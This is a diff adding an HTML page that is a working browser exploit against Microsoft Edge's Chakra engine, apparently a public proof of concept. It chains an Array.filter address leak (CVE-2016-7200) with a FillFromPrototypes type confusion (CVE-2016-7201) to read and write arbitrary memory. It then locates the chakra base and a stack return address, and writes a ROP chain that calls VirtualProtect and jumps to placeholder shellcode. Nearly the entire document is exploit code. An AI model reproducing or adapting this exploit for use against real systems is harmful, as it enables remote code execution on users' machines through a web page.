@@ -1,0 +1,184 @@
+<html>
+    <head>
+        <script src="long.min.js"></script>
+    </head>
+    <body>
+        <script>
+            var Long = dcodeIO.Long;
+
+            var dv;
+            var fdv = new DataView(new ArrayBuffer(8));
+            var x = (new Array(56, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)).slice();
+            var [hi, lo] = PutDataAndGetAddr(x);
+            [hi, lo] = [hi|0, (lo + 0x58)|0];                           // offset (0x58) to the array data slots
+            //alert("Addr: 0x" + (new Long(lo|0, hi|0, true)).toString(16));
+            TriggerFillFromPrototypesBug(lo, hi);
+
+            var vtable = Read64(new Long(lo - 0x58, hi, true));
+            var chakraBase = Read64(vtable).sub(0x274C40);
+            //alert("chakraBase: 0x" + chakraBase.toString(16));
+            var threadCtxPtr = Read64(chakraBase.add(0x735EA8));
+            //alert("threadCtxPtr: 0x" + threadCtxPtr.toString(16));
+
+            var stackLimit = Read64(threadCtxPtr.add(0x388));
+            var stack = stackLimit.sub(0xC000).add(10*1024*1024);       // 10 MB thread stack
+            var retPtr = chakraBase.add(0x162A1D);                      // Inside ScriptEngine::ExecutePendingScripts (after a call to Execute)
+            var retPtrAddr;
+            for (var i = 8; i < 32 * 1024; i += 8)
+            {
+                var val = Read64(stack.sub(i));
+                if (val.equals(retPtr))
+                {
+                    retPtrAddr = stack.sub(i);
+                    break;
+                }
+            }
+            //alert("retPtrAddr: 0x" + retPtrAddr.toString(16));
+
+            var sc = unescape("%ucccc%ucccc");
+            var [shi, slo] = PutDataAndGetAddr(sc);
+            var shcodeAddr = Read64((new Long(slo|0, shi|0, true).add(0x20)));          // offset (0x20) to the pointer to the buffer
+            //alert("shcodeAddr: 0x" + shcodeAddr.toString(16));
+
+            var filler = new Long(0, 0, true);
+            var rop = [
+                /*
+                    chakraBase + 0x1DA2F5           // pop rdi; pop rsi; pop rbx; retn
+                    shcodeAddr & 0xFF..FFF000       // lpAddress
+                    0x1000                          // dwSize
+                    0x40                            // flNewProtect
+                    chakraBase + 0x1DA2CB           // setup args => call VirtualProtect
+                    ...                             // 0x30 garbage (6 * uint64)
+                    0                               // In order to pass check
+                    ...                             // 0x98 - 0x38 garbage (12 * uint64)
+                    shcodeAddr                      // Finally return to our shellcode!
+                */
+                chakraBase.add(0x1DA2F5),
+                shcodeAddr.and(new Long(0xFFFFF000, 0xFFFFFFFF, true)),
+                new Long(0x1000, 0, true),
+                new Long(0x40, 0, true),
+                chakraBase.add(0x1DA2CB),
+                filler, filler, filler, filler, filler, filler,
+                new Long(0, 0, true),
+                filler, filler, filler, filler, filler, filler,
+                filler, filler, filler, filler, filler, filler,
+                shcodeAddr
+            ];
+
+            for (var i = 0; i < rop.length; ++i)
+            {
+                Write64(retPtrAddr.add(i * 8), rop[i]);
+            }
+
+            alert("Boom!");
+
+            //encodeURI("1337");
+
+
+            /* Using FillFromPrototypes bug (CVE-2016-7201) */
+            function TriggerFillFromPrototypesBug(lo, hi)
+            {
+                // Type* (which has TypeId)
+                x[2] = lo;
+                x[3] = hi;
+
+                // +0x3C points to 0 (index 1) for bypassing isDetached check
+                x[10] = (lo - 0x38)|0;
+                x[11] = hi;
+
+                // buffer length
+                x[8] = 0x200;
+
+                // buffer addr
+                x[14] = (lo - 0x58)|0;
+                x[15] = hi;
+
+                var a = new Array(0x11111111, 0, 0x22222222, 0, 0x33333333, 0, lo, hi, 0x55555555, 0);
+
+                var handler = {
+                    getPrototypeOf: function(target, name) {
+                        return a;
+                    }
+                };
+
+                var p = new Proxy([], handler);
+                var b = [{}, [], "abc"];
+
+                b.__proto__ = p;
+                b.length = 4;
+
+                a.shift.call(b);
+                dv = b[2];
+            }
+
+            /* Using Array.filter InfoLeak bug (CVE-2016-7200) */
+            function PutDataAndGetAddr(t)
+            {
+                var d = new Array(1,2,3);
+                class dummy {
+                    constructor() {
+                        return d;
+                    }
+                }
+
+                class MyArray extends Array {
+                    static get [Symbol.species]() {
+                        return dummy;
+                    }
+                }
+
+                var a = new Array({}, t, "theori", 7, 7, 7, 7, 7);
+
+                function test(i) {
+                    return true;
+                }
+
+                a.__proto__ = MyArray.prototype;
+
+                var o = a.filter(test);
+                var h = [];
+
+                for (item in o) {
+                    var n = new Number(o[item]);
+                    if (n < 0) {
+                        n = n + 0x100000000;
+                    }
+                    h.push(n);
+                }
+                return [h[3], h[2]];
+            }
+
+            /* Utility */
+            function SetAddress(addr)
+            {
+                x[14] = addr.low|0;
+                x[15] = addr.high|0;
+            }
+
+            function Read32(addr)
+            {
+                SetAddress(addr);
+                return new Long(fdv.getUint32.call(dv, 0, true), 0, true);
+            }
+
+            function Read64(addr)
+            {
+                SetAddress(addr);
+                return new Long(fdv.getUint32.call(dv, 0, true), fdv.getUint32.call(dv, 4, true), true);
+            }
+
+            function Write32(addr, val)
+            {
+                SetAddress(addr);
+                fdv.setUint32.call(dv, 0, val.low|0, true);
+            }
+
+            function Write64(addr, val)
+            {
+                SetAddress(addr);
+                fdv.setUint32.call(dv, 0, val.low|0, true);
+                fdv.setUint32.call(dv, 4, val.high|0, true);
+            }
+        </script>
+    </body>
+</html>
